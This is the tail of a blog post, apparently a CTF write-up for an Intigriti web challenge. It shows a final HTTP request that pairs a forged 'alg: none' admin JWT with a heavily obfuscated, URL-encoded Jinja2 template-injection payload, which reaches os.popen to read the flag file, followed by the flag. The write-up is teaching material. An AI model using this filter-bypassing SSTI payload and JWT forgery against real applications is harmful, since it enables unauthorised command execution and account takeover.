</span><span style="color:#abb2bf;">   &lt;/</span><span style="color:#eb6772;">p</span><span style="color:#abb2bf;">&gt;
</span><span style="color:#abb2bf;">  &lt;/</span><span style="color:#eb6772;">div</span><span style="color:#abb2bf;">&gt;
</span><span style="color:#abb2bf;">&lt;/</span><span style="color:#eb6772;">div</span><span style="color:#abb2bf;">&gt;
</span></code></pre>
<p>Recursively searching the <code>/app</code> directory with <code>ls -lahR</code> reveals a hidden directory named <code>.aquacommerce</code> that contains the file <code>019a82cf.txt</code>, which holds the flag.</p>
<p>Final Request:</p>
<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">POST /admin/profile HTTP/2
</span><span style="color:#abb2bf;">Host: challenge-1125.intigriti.io
</span><span style="color:#abb2bf;">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYzODA0NjQxfQ.
</span><span style="color:#abb2bf;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
</span><span style="color:#abb2bf;">Content-Type: application/x-www-form-urlencoded
</span><span style="color:#abb2bf;">Content-Length: 3740
</span><span style="color:#abb2bf;">
</span><span style="color:#abb2bf;">display_name=%7B%25set%20at%3Ddict%28rtta%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20nd%3Ddict%28so%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ls%3D%27cat%20%2Fapp%2F%2Eaquacommerce%2F019a82cf%2Etxt%27%25%7D%7B%25set%20re%3Ddict%28daer%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20uj%3Ddict%28a%3Dx%2Cb%3Dx%2Cc%3Dx%29%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20in%3Ddict%28tini%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ii%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bin%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20gl%3Ddict%28slabolg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20go%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bgl%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20ge%3Ddict%28metiteg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20gi%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bge%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20bu%3Ddict%28snitliub%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20bl%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bbu%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20im%3Ddict%28tropmi%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ip%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bim%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20cx%3Ddict%28aaaaa%3Dx%29%7Cfirst%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20dp%3Duj%2Bla%25%7D%7B%25set%20et%3Dlla%2Blla%2Blla%2Bdp%25%7D%7B%25set%20po%3D%28%28%7B%7D%7Cescape%7Curlencode%7Cfirst%2Bdict%28c%3Dx%29%7Cjoin%29%2Acx%29%25%28llla%2Bla%2Cllla%2Cllla%2Bla%2Csbb%2Bet%2Bbb%2Bla%2Bla%2Csbb%2Bet%2Blla%2Bbb%29%25%7D%7B%25print%20%28%28%28%28%28%28%28%28%28%28%28x%2C%29%7Cmap%28at%2Cii%29%7Cfirst%2C%29%7Cmap%28at%2Cgo%29%7Cfirst%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28bl%29%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28ip%29%29%28nd%29%2C%29%7Cmap%28at%2Cpo%29%7Cfirst%29%28ls%29%2C%29%7Cmap%28at%2Cre%29%7Cfirst%29%28%29%25%7D%0D%0A
</span></code></pre>
<p>And the final flag is:</p>
<p><code>INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}</code></p>
<h2 id="c0ngr4ts">C0ngr4ts!</h2>
<p><a href="https://x.com/MachIaVellill">X</a></p>
<p><a href="https://keybase.io/makyavelli">Keybase</a></p>

    </div>

    
        <footer>
            <hr>
            <p>
                
                    Published by Machiavelli
                
                
                    
                    in <a href="https://machiavelli.me/categories/ctf/">CTF</a>
                
                
                    and
                    tagged
                    
                        <a href="https://machiavelli.me/tags/ctf/">CTF</a>
                        
                            
                                
                                    ,
                                
                            
                        
                    
                        <a href="https://machiavelli.me/tags/challenge/">Challenge</a>
                        
                            
                                
                                    ,
                                
                            
                        
                    
                        <a href="https://machiavelli.me/tags/intigriti/">Intigriti</a>
                        
                            
                                
                                    ,
                                
                            
                        
                    
                        <a href="https://machiavelli.me/tags/rce/">RCE</a>
                        
                            
                                
                                    ,
                                
                            
                        
                    
                        <a href="https://machiavelli.me/tags/ssti/">SSTI</a>
                        
                            
                                
                                    ,
                                
                            
                        
                    
                        <a href="https://machiavelli.me/tags/jwt/">JWT</a>
                        
                            
                                
                                    and
                                
                            
                        
                    
                        <a href="https://machiavelli.me/tags/l33t/">l33t</a>
                        
                            
                        
                    
                
            </p>
            
            
        </footer>
    
</article>



  <!-- optional scripts -->
  
  
  <script src="https://machiavelli.me/js/codeblock.js"></script>
  

  
<!-- MathJax script for rendering LaTeX math equations -->
<script>
  MathJax = {
    tex: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"],
      ],
      displayMath: [
        ["$$", "$$"],
        ["\\[", "\\]"],
      ],
    },
  };
</script>
<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>


  
<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>


  
</body>

</html>
